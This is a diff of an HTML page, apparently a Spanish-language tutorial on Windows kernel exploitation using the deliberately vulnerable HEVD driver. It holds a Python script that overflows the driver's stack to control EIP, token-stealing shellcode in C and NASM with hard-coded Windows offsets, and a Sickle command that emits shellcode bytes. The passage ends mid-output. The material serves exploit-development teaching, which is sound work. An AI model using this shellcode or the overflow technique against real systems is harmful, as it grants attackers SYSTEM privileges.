+</span></span><span class="line"><span class="cl">  <span class="n">hHEVD</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">CreateFileA</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\\\\</span><span class="s2">.</span><span class="se">\\</span><span class="s2">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="p">(</span><span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                               <span class="mh">0x00</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="n">NULL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="n">OPEN_EXISTING</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="n">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">hHEVD</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">3000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Calling control code 0x222003&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">kernel32</span><span class="o">.</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hHEVD</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="mh">0x222003</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">buffer</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="nb">len</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">NULL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="mh">0x00</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">byref</span><span class="p">(</span><span class="n">c_ulong</span><span class="p">()),</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">()</span>
 </span></span></code></pre></div><p>Una vez enviado, podemos ver que hemos sobrescrito una dirección que utiliza la computadora para regresar y hemos ganado control sobre el puntero de instrucción (EIP).</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/eip_7.png" alt="alt text"></p>
-<h2 id="kernel-shellcode">Kernel Shellcode??</h2>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/eip_7.png" alt="alt text" />
+      
+    </figure>
+</p>
+
+
+<h2 class="relative group">Kernel Shellcode?? 
+    <div id="kernel-shellcode" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#kernel-shellcode" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
 <p>Entonces tenemos control sobre el puntero de las instrucciones, y tenemos un conocimiento sólido de cómo. Una pregunta falta, ¿cómo podemos manipular código para ejecutar? Es mas, cómo podemos crear un &ldquo;shell&rdquo; de &ldquo;SYSTEM&rdquo;?</p>
 <p>Vamos a necesitar shellcode, sin embargo, no podemos usar cualquier shellcode. Como estamos corriendo bajo el contexto de el Kernel, un paso equivocado resulta en una pantalla de muerte azul (BSOD). Para alcanzar nuestro objetivo, utilizaremos una técnica conocida como <strong>Token Stealing</strong>. Usando esta técnica, copiaremos un token con privilegios a nuestro proceso.</p>
 <p>Por suerte para nosotros, HEVD viene con copias de Payloads incluyendo este. Echemos una mirada a <em>Payloads.c</em> dentro del repositro.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">186</span> VOID <span style="color:#a6e22e">TokenStealingPayloadWin7Generic</span>() {
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">187</span>     <span style="color:#75715e">// No Need of Kernel Recovery as we are not corrupting anything
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">188</span>     <span style="color:#66d9ef">__asm</span> {
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">189</span>         pushad                               ; Save registers state
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">190</span>         
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">191</span>         ; Start of Token Stealing Stub       
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">192</span>         xor eax, eax                         ; Set ZERO
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">193</span>         mov eax, fs:[eax <span style="color:#f92672">+</span> KTHREAD_OFFSET]   ; Get nt<span style="color:#f92672">!</span>_KPCR.PcrbData.CurrentThread
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">194</span>                                              ; _KTHREAD is located at FS:[<span style="color:#ae81ff">0x124</span>]
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">195</span>         
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">196</span>         mov eax, [eax <span style="color:#f92672">+</span> EPROCESS_OFFSET]     ; Get nt<span style="color:#f92672">!</span>_KTHREAD.ApcState.Process
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">197</span>         
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">198</span>         mov ecx, eax                         ; Copy current process _EPROCESS structure
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">199</span>         
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>         mov edx, SYSTEM_PID                  ; WIN <span style="color:#ae81ff">7</span> SP1 SYSTEM process PID <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">201</span>         
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">202</span>         SearchSystemPID:
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">203</span>             mov eax, [eax <span style="color:#f92672">+</span> FLINK_OFFSET]    ; Get nt<span style="color:#f92672">!</span>_EPROCESS.ActiveProcessLinks.Flink
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">204</span>             sub eax, FLINK_OFFSET
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">205</span>             cmp [eax <span style="color:#f92672">+</span> PID_OFFSET], edx      ; Get nt<span style="color:#f92672">!</span>_EPROCESS.UniqueProcessId
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">206</span>             jne SearchSystemPID
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">207</span>         
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">208</span>         mov edx, [eax <span style="color:#f92672">+</span> TOKEN_OFFSET]        ; Get SYSTEM process nt<span style="color:#f92672">!</span>_EPROCESS.Token
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">209</span>         mov [ecx <span style="color:#f92672">+</span> TOKEN_OFFSET], edx        ; Replace target process nt<span style="color:#f92672">!</span>_EPROCESS.Token
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">210</span>                                              ; with SYSTEM process nt<span style="color:#f92672">!</span>_EPROCESS.Token
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">211</span>         ; End of Token Stealing Stub
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">212</span>         
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">213</span>         popad                                ; Restore registers state
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">214</span>     }
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">215</span> }
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">186</span> <span class="n">VOID</span> <span class="nf">TokenStealingPayloadWin7Generic</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="mi">187</span>     <span class="c1">// No Need of Kernel Recovery as we are not corrupting anything
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">188</span>     <span class="kr">__asm</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="mi">189</span>         <span class="n">pushad</span>                               <span class="p">;</span> <span class="n">Save</span> <span class="n">registers</span> <span class="n">state</span>
+</span></span><span class="line"><span class="cl"><span class="mi">190</span>         
+</span></span><span class="line"><span class="cl"><span class="mi">191</span>         <span class="p">;</span> <span class="n">Start</span> <span class="n">of</span> <span class="n">Token</span> <span class="n">Stealing</span> <span class="n">Stub</span>       
+</span></span><span class="line"><span class="cl"><span class="mi">192</span>         <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>                         <span class="p">;</span> <span class="n">Set</span> <span class="n">ZERO</span>
+</span></span><span class="line"><span class="cl"><span class="mi">193</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="nl">fs</span><span class="p">:[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">KTHREAD_OFFSET</span><span class="p">]</span>   <span class="p">;</span> <span class="n">Get</span> <span class="n">nt</span><span class="o">!</span><span class="n">_KPCR</span><span class="p">.</span><span class="n">PcrbData</span><span class="p">.</span><span class="n">CurrentThread</span>
+</span></span><span class="line"><span class="cl"><span class="mi">194</span>                                              <span class="p">;</span> <span class="n">_KTHREAD</span> <span class="n">is</span> <span class="n">located</span> <span class="n">at</span> <span class="nl">FS</span><span class="p">:[</span><span class="mh">0x124</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="mi">195</span>         
+</span></span><span class="line"><span class="cl"><span class="mi">196</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">EPROCESS_OFFSET</span><span class="p">]</span>     <span class="p">;</span> <span class="n">Get</span> <span class="n">nt</span><span class="o">!</span><span class="n">_KTHREAD</span><span class="p">.</span><span class="n">ApcState</span><span class="p">.</span><span class="n">Process</span>
+</span></span><span class="line"><span class="cl"><span class="mi">197</span>         
+</span></span><span class="line"><span class="cl"><span class="mi">198</span>         <span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">eax</span>                         <span class="p">;</span> <span class="n">Copy</span> <span class="n">current</span> <span class="n">process</span> <span class="n">_EPROCESS</span> <span class="n">structure</span>
+</span></span><span class="line"><span class="cl"><span class="mi">199</span>         
+</span></span><span class="line"><span class="cl"><span class="mi">200</span>         <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">SYSTEM_PID</span>                  <span class="p">;</span> <span class="n">WIN</span> <span class="mi">7</span> <span class="n">SP1</span> <span class="n">SYSTEM</span> <span class="n">process</span> <span class="n">PID</span> <span class="o">=</span> <span class="mh">0x4</span>
+</span></span><span class="line"><span class="cl"><span class="mi">201</span>         
+</span></span><span class="line"><span class="cl"><span class="mi">202</span>         <span class="nl">SearchSystemPID</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="mi">203</span>             <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">FLINK_OFFSET</span><span class="p">]</span>    <span class="p">;</span> <span class="n">Get</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">ActiveProcessLinks</span><span class="p">.</span><span class="n">Flink</span>
+</span></span><span class="line"><span class="cl"><span class="mi">204</span>             <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="n">FLINK_OFFSET</span>
+</span></span><span class="line"><span class="cl"><span class="mi">205</span>             <span class="n">cmp</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">PID_OFFSET</span><span class="p">],</span> <span class="n">edx</span>      <span class="p">;</span> <span class="n">Get</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">UniqueProcessId</span>
+</span></span><span class="line"><span class="cl"><span class="mi">206</span>             <span class="n">jne</span> <span class="n">SearchSystemPID</span>
+</span></span><span class="line"><span class="cl"><span class="mi">207</span>         
+</span></span><span class="line"><span class="cl"><span class="mi">208</span>         <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">TOKEN_OFFSET</span><span class="p">]</span>        <span class="p">;</span> <span class="n">Get</span> <span class="n">SYSTEM</span> <span class="n">process</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">Token</span>
+</span></span><span class="line"><span class="cl"><span class="mi">209</span>         <span class="n">mov</span> <span class="p">[</span><span class="n">ecx</span> <span class="o">+</span> <span class="n">TOKEN_OFFSET</span><span class="p">],</span> <span class="n">edx</span>        <span class="p">;</span> <span class="n">Replace</span> <span class="n">target</span> <span class="n">process</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">Token</span>
+</span></span><span class="line"><span class="cl"><span class="mi">210</span>                                              <span class="p">;</span> <span class="n">with</span> <span class="n">SYSTEM</span> <span class="n">process</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">Token</span>
+</span></span><span class="line"><span class="cl"><span class="mi">211</span>         <span class="p">;</span> <span class="n">End</span> <span class="n">of</span> <span class="n">Token</span> <span class="n">Stealing</span> <span class="n">Stub</span>
+</span></span><span class="line"><span class="cl"><span class="mi">212</span>         
+</span></span><span class="line"><span class="cl"><span class="mi">213</span>         <span class="n">popad</span>                                <span class="p">;</span> <span class="n">Restore</span> <span class="n">registers</span> <span class="n">state</span>
+</span></span><span class="line"><span class="cl"><span class="mi">214</span>     <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="mi">215</span> <span class="p">}</span>
 </span></span></code></pre></div><p>Vamos a dividir esto línea por línea. En línea <em>192</em> borramos el registro EAX. Después, en línea <em>193</em> usamos el registro <em>FS</em> para obtener la dirección del &ldquo;current thread&rdquo; ubicado desde la distancia 0x124. Podemos ver esto con WinDbg:</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/thread_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/thread_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Vamos a mapear la estructura, primero necesitamos la dirección del el <em>PCR (Processor Control Region)</em>, también conocido como el <em>_KPCR</em> desde allí podemos fácilmente iterar sobre la estructura y encontrar el &ldquo;current thread&rdquo;.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/map_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/map_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Después, necesitamos encontrar la dirección de la estructura <em>_EPROCESS (&ldquo;Executive Process&rdquo;)</em>.</p>
 <p>Cada proceso en ejecución en un los systemas de Windows esta asociado con un estructura de EPROCESS. Podemos hacer esto tal como hicimos el _KCPR.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/eprocess_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/eprocess_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Ahora veamos el siguiente bloque de código dentro de este &ldquo;payload&rdquo; (aqi siéntete libre de nomas leer porque en este punto comencé a escribir el código para Sickle):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>         SearchSystemPID:
-</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">FLINK_OFFSET</span>]    <span style="color:#75715e">; Get nt!_EPROCESS.ActiveProcessLinks.Flink
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>             <span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">FLINK_OFFSET</span>
-</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">cmp</span> [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">PID_OFFSET</span>], <span style="color:#66d9ef">edx</span>      <span style="color:#75715e">; Get nt!_EPROCESS.UniqueProcessId
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>             <span style="color:#a6e22e">jne</span> <span style="color:#66d9ef">SearchSystemPID</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">         <span class="nl">SearchSystemPID:</span>
+</span></span><span class="line"><span class="cl">             <span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="no">FLINK_OFFSET</span><span class="p">]</span>    <span class="c1">; Get nt!_EPROCESS.ActiveProcessLinks.Flink
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>             <span class="nf">sub</span> <span class="no">eax</span><span class="p">,</span> <span class="no">FLINK_OFFSET</span>
+</span></span><span class="line"><span class="cl">             <span class="nf">cmp</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="no">PID_OFFSET</span><span class="p">],</span> <span class="no">edx</span>      <span class="c1">; Get nt!_EPROCESS.UniqueProcessId
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>             <span class="nf">jne</span> <span class="no">SearchSystemPID</span>
 </span></span></code></pre></div><p>Aquí estamos extractado el puntero al <em>forward link (FLINK) pointer</em> desde el *_EPROCESS&quot; corriente, luego restando la distancia al FLINK desde EAX para cambiar EAX para señalar el siguiente estructura _EPROCESS dentro del lista enlazada. Luego comparamos la identificación del proceso de la estructura _EPROCESS a 0x04 y si no se encuentra seguimos buscando hasta que encontramos el proceso de &ldquo;SYSTEM&rdquo;.</p>
 <p>Una vez que encontramos el proceso, simplemente reemplazamos nuestro token del proceso &ldquo;SYSTEM&rdquo;. Esto es casi como un cazador de huevos (&ldquo;egghunter&rdquo;) pero para los tokens.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>         <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">TOKEN_OFFSET</span>]        <span style="color:#75715e">; Get SYSTEM process nt!_EPROCESS.Token
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>         <span style="color:#a6e22e">mov</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">TOKEN_OFFSET</span>], <span style="color:#66d9ef">edx</span>        <span style="color:#75715e">; Replace target process nt!_EPROCESS.Token
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                              <span style="color:#75715e">; with SYSTEM process nt!_EPROCESS.Token
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">         <span class="nf">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="no">TOKEN_OFFSET</span><span class="p">]</span>        <span class="c1">; Get SYSTEM process nt!_EPROCESS.Token
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>         <span class="nf">mov</span> <span class="p">[</span><span class="no">ecx</span> <span class="err">+</span> <span class="no">TOKEN_OFFSET</span><span class="p">],</span> <span class="no">edx</span>        <span class="c1">; Replace target process nt!_EPROCESS.Token
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                              <span class="c1">; with SYSTEM process nt!_EPROCESS.Token
 </span></span></span></code></pre></div><p>El código se puede ver aqi:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">BITS</span> <span style="color:#ae81ff">32</span>      ]
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">SECTION</span> <span style="color:#66d9ef">.text</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">global</span> <span style="color:#66d9ef">_start</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>_start:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pushad</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>                      <span style="color:#75715e">; set ZERO
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> <span style="color:#66d9ef">fs</span>:[<span style="color:#66d9ef">eax</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x124</span>]     <span style="color:#75715e">; nt!_KPCR.PcrbData.CurrentThread
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x50</span>]             <span style="color:#75715e">; nt!_KTHREAD.ApcState.Process
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">eax</span>                      <span style="color:#75715e">; Copy current process _EPROCESS structure
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#ae81ff">0x04</span>                     <span style="color:#75715e">; WIN 10 SYSTEM PROCESS PID
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>        SearchSystemPID:
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xb8</span>]         <span style="color:#75715e">; nt!_EPROCESS.ActiveProcessLinks.Flink
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">0xb8</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">cmp</span> [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xb4</span>], <span style="color:#66d9ef">edx</span>         <span style="color:#75715e">; nt!_EPROCESS.UniqueProcessId
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#a6e22e">jne</span> <span style="color:#66d9ef">SearchSystemPID</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xf8</span>]             <span style="color:#75715e">; Get SYSTEM process nt!_EPROCESS.Token
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xf8</span>], <span style="color:#66d9ef">edx</span>             <span style="color:#75715e">; Replace target process nt!_EPROCESS.Token
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">popad</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">[</span><span class="nf">BITS</span> <span class="mi">32</span>      <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">SECTION</span> <span class="no">.text</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">global</span> <span class="no">_start</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">_start:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nf">pushad</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>                      <span class="c1">; set ZERO
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="no">dword</span> <span class="no">fs</span><span class="p">:[</span><span class="no">eax</span><span class="err">+</span><span class="mi">0x124</span><span class="p">]</span>     <span class="c1">; nt!_KPCR.PcrbData.CurrentThread
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">0x50</span><span class="p">]</span>             <span class="c1">; nt!_KTHREAD.ApcState.Process
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">eax</span>                      <span class="c1">; Copy current process _EPROCESS structure
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x04</span>                     <span class="c1">; WIN 10 SYSTEM PROCESS PID
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="nl">SearchSystemPID:</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">0xb8</span><span class="p">]</span>         <span class="c1">; nt!_EPROCESS.ActiveProcessLinks.Flink
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nf">sub</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0xb8</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">cmp</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">0xb4</span><span class="p">],</span> <span class="no">edx</span>         <span class="c1">; nt!_EPROCESS.UniqueProcessId
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nf">jne</span> <span class="no">SearchSystemPID</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nf">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">0xf8</span><span class="p">]</span>             <span class="c1">; Get SYSTEM process nt!_EPROCESS.Token
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span> <span class="p">[</span><span class="no">ecx</span> <span class="err">+</span> <span class="mi">0xf8</span><span class="p">],</span> <span class="no">edx</span>             <span class="c1">; Replace target process nt!_EPROCESS.Token
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">popad</span>
 </span></span></code></pre></div><p>Veamos esto en el depurador (debugger), puedes generarlo usando <em>Sickle</em>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 sickle.py -p windows/x86/kernel_token_stealer -f python3 -v shellcode
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Bytecode generated by Sickle, size: 52 bytes</span>
-</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> bytearray<span style="color:#f92672">()</span>
-</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#39;\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89&#39;</span>
-</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#39;\xc1\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8&#39;</span>
